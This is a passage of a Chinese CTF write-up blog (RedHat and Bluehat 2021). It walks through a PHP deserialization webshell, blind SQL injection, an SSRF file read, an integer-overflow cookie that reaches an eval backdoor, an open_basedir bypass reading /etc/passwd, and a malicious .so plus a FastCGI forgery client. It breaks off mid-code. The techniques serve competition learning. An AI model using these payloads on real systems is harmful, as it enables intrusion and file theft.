single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// poc2</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 生成poc</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这里原poc打的参数是data，这里修改为message</p><img src="/article/redhat2021/image-20210509210754051.png" class="" title="message" loading="lazy"><p>打过去就行，虽然报错但是已经执行了</p><img src="/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png" class="" title="poc" loading="lazy"><p>在当前目录会生成<code>1.php</code>，蚁剑连一下</p><img src="/article/redhat2021/image-20210509211521847.png" class="" title="getshell" loading="lazy"><p>发现有disable_function，当时心凉一截，不会和蓝帽一样…</p><p>侥幸心理测了下蚁剑的突破插件，发现<code>Apache_mod_cgi</code>可以，执行根目录下<code>/readflag</code>即可</p><img src="/article/redhat2021/image-20210509211350611.png" class="" title="web2flag" loading="lazy"><hr><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>打开登陆界面，估计是注入</p><p>看看连接，发现异常请求，还好没上来对着<code>username</code>乱试</p><img src="/article/redhat2021/image-20210509212002489.png" class="" title="imagephp" loading="lazy"><p>经测试，可以使用异或 盲注</p><pre class="language-none"><code class="language-none">错误语句返回报错正确语句错误表达返回：WHAT ARE YOU DOING正确语句id为1返回图片正确语句id为0返回空</code></pre><img src="/article/redhat2021/image-20210509212509022.png" class="" title="1^1" loading="lazy"><img src="/article/redhat2021/image-20210509212527090.png" class="" title="1^0" loading="lazy"><img src="/article/redhat2021/image-20210509212645414.png" class="" title="error" loading="lazy"><p>异或盲注脚本跑，可见以前写的WP</p><p>拿到信息如下</p><pre class="language-none"><code class="language-none"># version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;5.5.60-0+deb8u1# databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf# tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;images,users# users.columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;username,password# users.data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;admin~a1d4f79c94f0cd3feeac4</code></pre><p>似乎密码还是容器随机的，拿到用户名密码登陆</p><img src="/article/redhat2021/image-20210509213045341.png" class="" title="ssrf" loading="lazy"><p>明显ssrf，用file协议读一下文件可行，直接读flag</p><p>payload：</p><pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre><img src="/article/redhat2021/image-20210509213219524.png" class="" title="web3flag" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯2021一道题——One_Pointer_PHP</title>
      <link href="article/bluehat2021/"/>
      <url>article/bluehat2021/</url>
      
        <content type="html"><![CDATA[<p>深入学习蓝帽杯web一道题</p><span id="more"></span><p>质量很高的一道题，详细写下做个总结，深入学习一下知识点</p><h2 id="WEB-One-Pointer-PHP"><a href="#WEB-One-Pointer-PHP" class="headerlink" title="WEB-One_Pointer_PHP"></a>WEB-One_Pointer_PHP</h2><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p>给了<code>www.zip</code>，部分源码，分析一下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>反序列化<code>cookies-&gt;data</code>使其$count[++$user-&gt;count]&#x3D;1;后<code>$count[]=1</code>为false即可eval执行命令，伴随应该题目还有更多考点，测试如下。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">count</span> <span class="token operator">=</span> <span class="token number">9223372036854775806</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"die"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><img src="/article/bluehat2021/image-20210503132210543.png" class="" title="count-test" loading="lazy"><p>在 PHP 中，有三种数组类型：</p><ul><li><p>索引数组 - 带有数字索引的数组</p><p> <code>$a = array(&quot;1&quot; =&gt; &quot;admin&quot;, &quot;0&quot; =&gt; &quot;gyy&quot;);</code>  &#x2F;&#x2F; key被双引号包裹</p></li><li><p>关联数组 - 带有指定键的数组</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token number">9223372036854775805</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span> => <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value</span><span class="token punctuation">&#125;</span></span>\r\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果如下</span><span class="token comment">//array(3) &#123;</span><span class="token comment">//    [9223372036854775806]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [9223372036854775807]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [-9223372036854775808]=></span><span class="token comment">//  int(1)</span><span class="token comment">//&#125;</span><span class="token comment">//9223372036854775806 => 1</span><span class="token comment">//9223372036854775807 => 1</span><span class="token comment">//-9223372036854775808 => 1</span><span class="token comment">//bool(true)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>多维数组 - 包含一个或多个数组的数组</p><p>俗称套娃</p></li></ul><p>感兴趣的师傅可以自己测试一下，这里只需要<code>$a-&gt;count=9223372036854775806</code>即long最大值时即可绕过(64位即2^64)</p><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>直接拿shell进去看看</p><img src="/article/bluehat2021/image-20210503134715662.png" class="" title="shell" loading="lazy"><p>这里用蚁剑示例，注意header里需要加Cookie为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</code></p><p>查看phpinfo，发现有很多disable_function</p><pre class="language-none"><code class="language-none">disable_function：stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursivedisable_classes:Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>还有open_basedir限制，利用自动化脚本无法突破。由于html目录可写，利用<code>glob://</code>协议先探测目录</p><blockquote><p>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</p></blockquote><pre class="language-none"><code class="language-none">&lt;?phpprintf(&#39;&lt;b&gt;open_basedir : %s &lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;, ini_get(&#39;open_basedir&#39;));$file_list &#x3D; array();&#x2F;&#x2F; normal files$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;&#x2F;&#x2F; special files (starting with a dot(.))$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;.*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;        echo &quot;&#123;$f&#125;&lt;br&#x2F;&gt;&quot;;&#125;?&gt;</code></pre><img src="/article/bluehat2021/image-20210503135244699.png" class="" title="flag" loading="lazy"><p>再利用如下，读取文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>读取php.ini</p><p><code> /usr/local/etc/php/php.ini</code></p><img src="/article/bluehat2021/image-20210503140055221.png" class="" title="ext" loading="lazy"><p>发现异常.so文件，可能是要加载然后pwn它，实在不会。</p><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// normal files</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///etc/nginx/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$f</span><span class="token punctuation">&#125;</span></span>&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>读<code>/etc/nginx/nginx.conf</code>，发现有<code>include /etc/nginx/sites-enabled/*;</code></p><p>转头读取<code>/etc/nginx/sites-enabled/default</code></p><img src="/article/bluehat2021/image-20210503142114737.png" class="" title="cgi" loading="lazy"><p>发现在9001端口开有FastCGI服务，phpinfo中也表明该项目为FPM&#x2F;FastCGI，可以通过未授权打FPM rce</p><img src="/article/bluehat2021/image-20210503141634940.png" class="" title="phpinfo" loading="lazy"><h3 id="加载恶意so文件"><a href="#加载恶意so文件" class="headerlink" title="加载恶意so文件"></a>加载恶意so文件</h3><p>写.so扩展</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / >/var/www/html/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><small>小插曲：这里发现输出到<code>/var/www/html/1</code>发现不行，结果名字换成a就可了，离谱</small></p><p>编译下</p><pre class="language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so</code></pre><p>注意的是用macos和linux编译是不同的，得用linux编译，编译完后上传至<code>/var/www/html</code></p><h3 id="伪造FastCGI请求PHP-CGI"><a href="#伪造FastCGI请求PHP-CGI" class="headerlink" title="伪造FastCGI请求PHP-CGI"></a>伪造FastCGI请求PHP-CGI</h3><p>同样写在html目录</p><blockquote><p>用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：</p><blockquote><p>{<br>‘GATEWAY_INTERFACE’: ‘FastCGI&#x2F;1.0’,<br>‘REQUEST_METHOD’: ‘GET’,<br>‘SCRIPT_FILENAME’: ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php’,<br>‘SCRIPT_NAME’: ‘&#x2F;index.php’,<br>‘QUERY_STRING’: ‘?a&#x3D;1&amp;b&#x3D;2’,<br>‘REQUEST_URI’: ‘&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2’,<br>‘DOCUMENT_ROOT’: ‘&#x2F;var&#x2F;www&#x2F;html’,<br>‘SERVER_SOFTWARE’: ‘php&#x2F;fcgiclient’,<br>‘REMOTE_ADDR’: ‘127.0.0.1’,<br>‘REMOTE_PORT’: ‘12345’,<br>‘SERVER_ADDR’: ‘127.0.0.1’,<br>‘SERVER_PORT’: ‘80’,<br>‘SERVER_NAME’: “localhost”,<br>‘SERVER_PROTOCOL’: ‘HTTP&#x2F;1.1’<br>}</p></blockquote></blockquote><ul><li>通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></li><li>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> 